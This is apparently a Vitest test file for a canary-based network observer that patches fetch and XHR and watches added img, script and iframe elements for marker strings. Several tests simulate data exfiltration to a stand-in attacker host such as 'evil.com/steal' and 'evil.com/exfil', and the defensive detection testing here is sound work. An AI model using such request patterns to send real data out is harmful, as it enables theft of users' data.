import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { observeNetwork, NetworkEvent } from '../../src/observe/network';

describe('observeNetwork', () => {
  let originalFetch: typeof window.fetch;
  let originalXHROpen: typeof XMLHttpRequest.prototype.open;
  let originalXHRSend: typeof XMLHttpRequest.prototype.send;
  let cleanupFn: (() => void) | null = null;

  beforeEach(() => {
    originalFetch = window.fetch;
    originalXHROpen = XMLHttpRequest.prototype.open;
    originalXHRSend = XMLHttpRequest.prototype.send;

    // Provide a mock fetch for jsdom
    if (typeof window.fetch !== 'function') {
      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(new Response('ok')));
    } else {
      vi.spyOn(window, 'fetch').mockResolvedValue(new Response('ok'));
    }
  });

  afterEach(() => {
    if (cleanupFn) {
      cleanupFn();
      cleanupFn = null;
    }
    // Ensure originals are restored
    window.fetch = originalFetch;
    XMLHttpRequest.prototype.open = originalXHROpen;
    XMLHttpRequest.prototype.send = originalXHRSend;
  });

  it('patches window.fetch — original is saved', () => {
    const beforePatch = window.fetch;
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_marker'], onEvent);
    // fetch should have been replaced
    expect(window.fetch).not.toBe(beforePatch);
  });

  it('cleanup restores original fetch', () => {
    const beforePatch = window.fetch;
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_marker'], onEvent);
    cleanupFn();
    cleanupFn = null;
    expect(window.fetch).toBe(beforePatch);
  });

  it('fires callback when fetch URL contains marker', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_marker'], onEvent);

    await window.fetch('https://evil.com/steal?data=cnry_marker');

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'fetch',
        matchedMarker: 'cnry_marker',
      })
    );
  });

  it('fires callback when fetch body contains marker', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_body123'], onEvent);

    await window.fetch('https://example.com/api', {
      method: 'POST',
      body: JSON.stringify({ data: 'cnry_body123' }),
    });

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'fetch',
        matchedMarker: 'cnry_body123',
      })
    );
  });

  it('does NOT fire callback for fetch without marker', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_nothere'], onEvent);

    await window.fetch('https://example.com/safe');

    expect(onEvent).not.toHaveBeenCalled();
  });

  it('fires callback when XHR URL contains marker', () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_xhr123'], onEvent);

    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://evil.com/steal?q=cnry_xhr123');
    xhr.send();

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'xhr',
        matchedMarker: 'cnry_xhr123',
      })
    );
  });

  it('fires callback when XHR body contains marker', () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_xhrbody'], onEvent);

    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://example.com/api');
    xhr.send('payload with cnry_xhrbody in it');

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'xhr',
        matchedMarker: 'cnry_xhrbody',
      })
    );
  });

  it('cleanup restores original XHR methods', () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_marker'], onEvent);
    cleanupFn();
    cleanupFn = null;
    expect(XMLHttpRequest.prototype.open).toBe(originalXHROpen);
    expect(XMLHttpRequest.prototype.send).toBe(originalXHRSend);
  });

  it('XHR open and send work correctly with WeakMap metadata', () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_meta'], onEvent);

    const xhr = new XMLHttpRequest();
    xhr.open('PUT', 'https://example.com/endpoint?key=cnry_meta');
    xhr.send();

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'xhr',
        method: 'PUT',
        url: 'https://example.com/endpoint?key=cnry_meta',
        matchedMarker: 'cnry_meta',
      })
    );
  });

  it('fires callback when an img element with marker in src is added', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_imgsrc'], onEvent);

    const img = document.createElement('img');
    img.setAttribute('src', 'https://evil.com/pixel?d=cnry_imgsrc');
    document.body.appendChild(img);

    // MutationObserver is async
    await new Promise(resolve => setTimeout(resolve, 0));

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'element',
        matchedMarker: 'cnry_imgsrc',
      })
    );
  });

  it('does not fire element callback for img without marker', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_nope'], onEvent);

    const img = document.createElement('img');
    img.setAttribute('src', 'https://example.com/image.png');
    document.body.appendChild(img);

    await new Promise(resolve => setTimeout(resolve, 0));

    // Only network events matching the marker should fire
    const elementEvents = onEvent.mock.calls
      .map(call => call[0])
      .filter((e: NetworkEvent) => e.type === 'element');
    expect(elementEvents).toHaveLength(0);
  });

  it('returns no-op cleanup function for empty markers', () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork([], onEvent);
    expect(typeof cleanupFn).toBe('function');
    // Should not throw
    cleanupFn();
    cleanupFn = null;
  });

  it('network event has correct timestamp property', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_time'], onEvent);

    await window.fetch('https://example.com/?q=cnry_time');

    expect(onEvent).toHaveBeenCalled();
    const event: NetworkEvent = onEvent.mock.calls[0][0];
    expect(typeof event.timestamp).toBe('number');
    expect(event.timestamp).toBeGreaterThan(0);
  });

  it('truncates body in event to 500 chars', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_long'], onEvent);

    const longBody = 'cnry_long' + 'x'.repeat(1000);
    await window.fetch('https://example.com/api', {
      method: 'POST',
      body: longBody,
    });

    expect(onEvent).toHaveBeenCalled();
    const event: NetworkEvent = onEvent.mock.calls[0][0];
    expect(event.body).toBeDefined();
    expect(event.body!.length).toBeLessThanOrEqual(500);
  });

  it('detects marker in script element src', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_script'], onEvent);

    const script = document.createElement('script');
    script.setAttribute('src', 'https://evil.com/exfil?cnry_script');
    document.body.appendChild(script);

    await new Promise(resolve => setTimeout(resolve, 0));

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'element',
        matchedMarker: 'cnry_script',
      })
    );
  });

  it('detects marker in iframe element src', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeNetwork(['cnry_iframe'], onEvent);

    const iframe = document.createElement('iframe');
    iframe.setAttribute('src', 'https://evil.com/exfil?cnry_iframe');
    document.body.appendChild(iframe);

    await new Promise(resolve => setTimeout(resolve, 0));

    expect(onEvent).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'element',
        matchedMarker: 'cnry_iframe',
      })
    );
  });
});
